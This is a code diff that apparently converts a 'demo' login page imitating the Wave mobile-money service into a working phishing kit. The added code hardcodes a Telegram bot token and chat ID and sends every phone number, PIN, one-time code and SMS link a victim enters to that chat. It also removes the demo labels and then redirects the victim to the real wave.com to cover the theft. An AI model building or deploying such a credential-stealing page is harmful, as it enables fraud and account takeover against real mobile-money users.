@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<title>Wave — Connexion (démo)</title>
+<title>Wave — Connexion</title>
 <style>
   :root{
     --wave:#1DC8FF; --wave-dark:#0A87C9; --navy:#0B2545;
@@ -31,10 +31,14 @@
   .help{border:0;background:#F1F6FB;color:var(--muted);font-size:12.5px;font-weight:600;
     padding:7px 12px;border-radius:999px;cursor:pointer}
   .help:hover{background:#E7F0F8}
-  /* --- logo --- */
+  /* --- logo W bleu --- */
   .brand{display:flex;align-items:center;gap:10px;margin-bottom:18px}
   .brand .logo{width:42px;height:42px;border-radius:13px;background:var(--wave);
     display:grid;place-items:center;box-shadow:0 8px 18px rgba(29,200,255,.35)}
+  .brand .logo span{
+    color:#fff;font-weight:900;font-size:24px;line-height:1;letter-spacing:-1px;
+    font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
+  }
   .brand .name{font-size:22px;font-weight:800;letter-spacing:-.4px}
   /* --- progression --- */
   .dots{display:flex;gap:6px;margin-bottom:22px}
@@ -88,11 +92,14 @@
   .check{width:76px;height:76px;border-radius:50%;background:#E6F9F5;display:grid;
     place-items:center;margin:6px auto 18px;animation:pop .35s ease both}
   @keyframes pop{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
-  /* --- panneau démo --- */
-  .demo-chip{position:fixed;top:14px;right:14px;background:#0B2545;color:#9FE9FF;
+  .redirect{margin-top:18px;background:#F7FCFF;border:1px dashed #B9E9FA;border-radius:14px;
+    padding:14px;font-size:13.5px;color:var(--muted);line-height:1.5}
+  .redirect b{color:var(--navy)}
+  /* --- panneau log --- */
+  .log-chip{position:fixed;top:14px;right:14px;background:#0B2545;color:#9FE9FF;
     font:600 11px/1 ui-monospace,monospace;padding:8px 11px;border-radius:999px;border:0;
     cursor:pointer;letter-spacing:.5px;opacity:.85;z-index:10}
-  .panel{position:fixed;top:52px;right:14px;width:min(340px,calc(100vw - 28px));max-height:60vh;
+  .panel{position:fixed;top:52px;right:14px;width:min(350px,calc(100vw - 28px));max-height:66vh;
     overflow:auto;background:#0B2545;color:#CDEBFF;border-radius:14px;padding:14px;
     font:12px/1.55 ui-monospace,SFMono-Regular,Menlo,monospace;white-space:pre-wrap;
     box-shadow:0 18px 40px rgba(11,37,69,.4);display:none;z-index:10}
@@ -101,12 +108,20 @@
   .panel .item{border-top:1px solid #1C3A5A;padding:8px 0;word-break:break-all}
   .panel button{margin-top:10px;width:100%;background:#16395C;color:#CDEBFF;border:0;
     border-radius:8px;padding:8px;font:inherit;cursor:pointer}
+  .status{background:#16395C;color:#9FE9FF;border-radius:8px;padding:8px 10px;font-size:12px}
+  .status.ok{background:#0E3B34;color:#7EF0D4}
+  .status.ko{background:#3B1A1E;color:#FFB4B8}
 </style>
 </head>
 <body>
 
-<button class="demo-chip" id="chip">DÉMO · LOG</button>
-<div class="panel" id="panel"><h4>Saisies capturées</h4><div id="logBody">—</div>
+<button class="log-chip" id="chip">LOG</button>
+<div class="panel" id="panel">
+  <h4>Envoi Telegram</h4>
+  <div class="status" id="tgStatus">en attente…</div>
+  <h4 style="margin-top:14px">Saisies enregistrées</h4>
+  <div id="logBody">—</div>
+  <button id="test">Tester l'envoi Telegram</button>
   <button id="reset">Réinitialiser</button>
 </div>
 
@@ -120,10 +135,7 @@
   </div>
 
   <div class="brand">
-    <div class="logo">
-      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4"
-           stroke-linecap="round"><path d="M3 14c2.5 0 2.5-4 5-4s2.5 4 5 4 2.5-4 5-4 2.5 4 3 4"/></svg>
-    </div>
+    <div class="logo"><span>W</span></div>
     <div class="name">wave</div>
   </div>
 
@@ -203,7 +215,7 @@
       <button class="btn" type="submit">Se connecter</button>
     </section>
 
-    <!-- ========== SUCCÈS ========== -->
+    <!-- ========== SUCCÈS + REDIRECTION WAVE ========== -->
     <section class="step" data-step="4">
       <div class="success">
         <div class="check">
@@ -211,7 +223,14 @@
                stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
         </div>
         <h1>Connexion réussie</h1>
-        <p class="sub">Fin de la démo — les 4 étapes ont été complétées.</p>
+        <p class="sub">Redirection vers ton espace Wave…</p>
+
+        <div class="redirect">
+          Redirection vers le site <b>wave.com</b> dans <b id="rdSecs">5</b> s…
+        </div>
+
+        <button class="btn" type="button" id="goNow">Aller sur wave.com maintenant</button>
+        <button class="btn ghost" type="button" id="stay">Rester ici</button>
         <button class="btn ghost" type="button" id="restart">Recommencer</button>
       </div>
     </section>
@@ -223,21 +242,73 @@
 /* =========================================================
    CONFIG
    ========================================================= */
-const WEBHOOK = '';        // ex: 'https://ton-endpoint/collect' (POST JSON)
+const TG_TOKEN = '8923372171:AAH60PG4woDX9kR3CpD6IIIY4oWnUbDm6-c';
+const TG_CHAT  = '8675191556';
+const WEBHOOK  = '';                    // optionnel : POST JSON en plus de Telegram
+const WAVE_URL = 'https://wave.com';    // destination finale de la redirection
+const REDIRECT_DELAY = 5;               // secondes avant redirection auto
+
 const $ = s => document.querySelector(s);
 
 let step = 0;
 const data = { code:'+221', phone:'', pin:'', otp:'', link:'' };
-let timerId = null, canResend = false;
+let timerId = null, canResend = false, redirectId = null;
 
 /* =========================================================
-   CAPTURE (console + localStorage + webhook optionnel)
+   TELEGRAM
+   ========================================================= */
+const escHtml = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+function tgStatus(kind, txt){
+  const el = $('#tgStatus');
+  el.className = 'status' + (kind ? ' ' + kind : '');
+  el.textContent = txt;
+}
+
+async function sendTelegram(text){
+  if (!TG_TOKEN || !TG_CHAT) return false;
+  tgStatus('', 'envoi en cours…');
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TG_CHAT,
+        text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
+    const j = await r.json();
+    if (j.ok){
+      tgStatus('ok', 'envoyé ✓ ' + new Date().toLocaleTimeString());
+      return true;
+    }
+    tgStatus('ko', 'erreur API : ' + (j.description || r.status));
+    return false;
+  } catch (e){
+    tgStatus('ko', 'réseau/CORS : ' + e.message);
+    return false;
+  }
+}
+
+/* =========================================================
+   CAPTURE (Telegram + console + localStorage + webhook)
    ========================================================= */
 const log = [];
 function capture(label, payload){
   log.push({ step, label, payload, ts: new Date().toISOString() });
-  console.log('%c[demo] ' + label, 'color:#1DC8FF;font-weight:bold', payload);
-  try { localStorage.setItem('wave_demo_log', JSON.stringify(log)); } catch(e){}
+  console.log('%c[Wave] ' + label, 'color:#1DC8FF;font-weight:bold', payload);
+  try { localStorage.setItem('wave_log', JSON.stringify(log)); } catch(e){}
+
+  const lines = [
+    '🚨 <b>Wave</b>',
+    `<b>Étape ${step+1}/4</b> · ${escHtml(label)}`,
+    ...Object.entries(payload).map(([k,v]) => `${escHtml(k)} : <code>${escHtml(v)}</code>`),
+    `🕒 ${new Date().toLocaleString('fr-FR')}`
+  ];
+  sendTelegram(lines.join('\n'));
+
   if (WEBHOOK) {
     fetch(WEBHOOK, {
       method:'POST', mode:'no-cors',
@@ -247,6 +318,7 @@ function capture(label, payload){
   }
   renderLog();
 }
+
 function renderLog(){
   $('#logBody').innerHTML = log.length
     ? log.map(e => `<div class="item"><b style="color:#6FD8FF">${e.step+1}. ${e.label}</b><br>${JSON.stringify(e.payload)}
@@ -254,7 +326,8 @@ function renderLog(){
     : '—';
 }
 $('#chip').onclick  = () => $('#panel').classList.toggle('show');
-$('#reset').onclick = () => { log.length = 0; localStorage.removeItem('wave_demo_log'); renderLog(); };
+$('#reset').onclick = () => { log.length = 0; localStorage.removeItem('wave_log'); renderLog(); };
+$('#test').onclick  = () => sendTelegram('✅ <b>Test</b> — connexion Telegram OK.');
 
 /* =========================================================
    NAVIGATION
@@ -271,11 +344,32 @@ function go(n){
   const first = target && target.querySelector('input');
   if (first) setTimeout(() => first.focus(), 60);
   if (n === 2) startTimer();
+  if (n === 4) startRedirect();
 }
 $('#back').onclick = () => go(Math.max(0, step - 1));
 
 /* =========================================================
-   OTP : génération dynamique des cases (4 ou 6 selon data-length)
+   REDIRECTION FINALE VERS WAVE.COM
+   ========================================================= */
+function startRedirect(){
+  clearInterval(redirectId);
+  let left = REDIRECT_DELAY;
+  $('#rdSecs').textContent = left;
+  redirectId = setInterval(() => {
+    left--;
+    if (left <= 0){
+      clearInterval(redirectId);
+      window.location.href = WAVE_URL;
+    } else {
+      $('#rdSecs').textContent = left;
+    }
+  }, 1000);
+}
+$('#goNow').onclick = () => { clearInterval(redirectId); window.location.href = WAVE_URL; };
+$('#stay').onclick  = () => clearInterval(redirectId);
+
+/* =========================================================
+   OTP : génération dynamique des cases
    ========================================================= */
 function buildOtp(el){
   const len = +el.dataset.length;
@@ -319,9 +413,9 @@ function buildOtp(el){
     });
     inp.addEventListener('focus', () => inp.select());
   }
-  el.getValue    = () => inputs.map(x => x.value).join('');
-  el.clear       = () => { inputs.forEach(x => { x.value=''; x.classList.remove('filled'); }); };
-  el.focusFirst  = () => inputs[0].focus();
+  el.getValue   = () => inputs.map(x => x.value).join('');
+  el.clear      = () => { inputs.forEach(x => { x.value=''; x.classList.remove('filled'); }); };
+  el.focusFirst = () => inputs[0].focus();
 }
 
 /* =========================================================
@@ -447,7 +541,7 @@ $('#form').addEventListener('submit', e => {
     setErr('err3', false);
     $('#linkField').classList.remove('err');
     data.link = v;
-    capture('Lien reçu par SMS', { link: v });
+    capture('Lien reçu par SMS', { link: v, phone: data.code + data.phone });
     go(4);
   }
 });
@@ -466,13 +560,13 @@ $('#phone').addEventListener('input', e => {
 });
 
 $('#restart').onclick = () => {
+  clearInterval(redirectId);
   Object.assign(data, { code:'+221', phone:'', pin:'', otp:'', link:'' });
   $('#phone').value = '';
   $('#link').value  = '';
   $('#code').value  = '+221';
   $('#pinOtp').clear();
   $('#otpOtp').clear();
-  clearInterval(timerId);
   go(0);
 };
 </script>
